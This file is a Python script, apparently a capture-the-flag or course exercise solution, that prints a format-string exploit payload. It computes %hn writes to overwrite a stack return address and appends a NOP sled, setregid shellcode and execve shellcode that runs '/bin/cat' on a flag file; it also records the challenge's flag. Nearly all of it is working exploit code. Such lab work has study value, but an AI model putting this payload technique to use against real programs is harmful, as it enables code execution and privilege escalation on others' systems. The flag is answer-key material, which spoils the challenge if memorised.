#!/usr/bin/env python

import sys
import struct


# flag: SKCTF{b4d_f0rm47_57r1n6_:(}


# Function to increment a little-endian address by 1 byte
def increment_address(addr, how_much=1):
    # Convert little-endian bytes to an integer
    addr_int = struct.unpack("<I", addr)[0] + how_much
    # Convert the incremented integer back to little-endian bytes
    return struct.pack("<I", addr_int)

# Function to calculate the format string for the second half and first half addresses
def calculate_format_string(first_half_addr, base=16):
    # The address to write: first_half_addr + 52 bytes
    target_addr = struct.unpack("<I", first_half_addr)[0] + 70
    
    # Adjust the address based on the 7-byte string and 16 bytes of return addresses
    lower_bytes_target = (target_addr & 0xFFFF) - 16  # Lower 16 bits of target, minus the offset
    upper_bytes_target = (target_addr >> 16) - (lower_bytes_target + 16)  # Upper 16 bits

    # Create the new format strings based on calculated values
    second_format_string = "%{}d%3$hn".format(lower_bytes_target).encode()
    first_half_format_string = "%{}d%4$hn".format(upper_bytes_target).encode()

    return second_format_string, first_half_format_string


cnt = 32

# IS561: A<string_format>
dummy = "\x41"

# Initial return addresses (in little-endian)
# 0xffffd8f6 == 4294957302
# 0xffffd8d4
second_half_return_address = struct.pack("<I", 0xffffd8d4)
first_half_return_address = struct.pack("<I", 0xffffd8d6)

# 0xffffd920
# 0xffffd91a
second_half_return_address = increment_address(second_half_return_address, cnt)
first_half_return_address = increment_address(first_half_return_address, cnt)


# NOP Sled
nop_sled = "\x90" * 41

second_format_string, first_half_format_string = calculate_format_string(first_half_return_address)

# setregid: badformatflag 1006
setregid_hex = "\x31\xDB\x66\xBB\xEE\x03\x31\xC9\x66\xB9\xEE\x03\x31\xC0\xB0\x47\xCD\x80"

# # bin_cat.s
bin_cat_s = "\x31\xC0\x50\x68\x2F\x63\x61\x74\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2E\x74\x78\x74\x68\x66\x6C\x61\x67\x89\xE1\x50\x51\x53\x89\xE1\x31\xD2\x8B\x19\xB0\x0B\xCD\x80\xB0\x01\x31\xDB\xCD\x80"


payload = dummy + \
            second_half_return_address + first_half_return_address + \
            second_format_string + first_half_format_string + \
            nop_sled + setregid_hex + bin_cat_s

sys.stdout.write(payload)
